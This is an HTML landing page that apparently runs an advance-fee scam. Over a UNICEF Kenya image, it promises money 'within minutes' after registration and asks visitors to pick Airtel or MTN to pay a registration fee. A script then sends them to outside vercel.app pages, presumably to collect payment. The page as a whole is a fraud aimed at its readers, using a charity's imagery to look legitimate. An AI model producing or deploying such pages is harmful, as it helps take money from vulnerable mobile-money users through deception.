<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>English Promotion</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-image: url('https://www.unicef.org/kenya/sites/unicef.org.kenya/files/styles/press_release_feature/public/WhatsApp%20Image%202020-11-19%20at%2010.26.26.jpeg.webp?itok=VbBZUeYS'); /* Replace 'background_image.jpg' with your image file */
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
        }
        .container {
            max-width: 600px;
            margin: 50px auto;
            padding: 20px;
            background-color: rgba(255, 255, 255, 0.8); /* Semi-transparent white background */
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        h1 {
            color: hsl(117, 94%, 50%);
            text-align: center;
        }
        p {
            color: #1a0fe8;
            margin-bottom: 20px;
        }
        ol {
            list-style-type: none;
            padding: 0;
        }
        li {
            margin-bottom: 10px;
            cursor: pointer;
            border: 2px solid #ceed08;
            border-radius: 5px;
            padding: 10px;
            background-color: #f9f9f9;
            transition: background-color 0.3s ease;
        }
        li:hover {
            background-color: #adee08;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Please Register Now to Receive Your MONEY WITHIN Minutes.</h1>
        <p>WHICH LINE WILL YOU USE TO PAY THE REGISTRATION FEE?</p>
        <ol>
            <li onclick="navigateTo('airtel')">Airtel</li>
            <li onclick="navigateTo('mtn')">MTN</li>
        </ol>
    </div>

    <script>
        function navigateTo(provider) {
            // Depending on the provider clicked, navigate to the corresponding page
            switch (provider) {
                case 'airtel':
                    window.location.href = 'https://a15.vercel.app/';
                    break;
                case 'mtn':
                    window.location.href = 'https://a16.vercel.app/';
                    break;
                default:
                    break;
            }
        }
    </script>
</body>
</html>
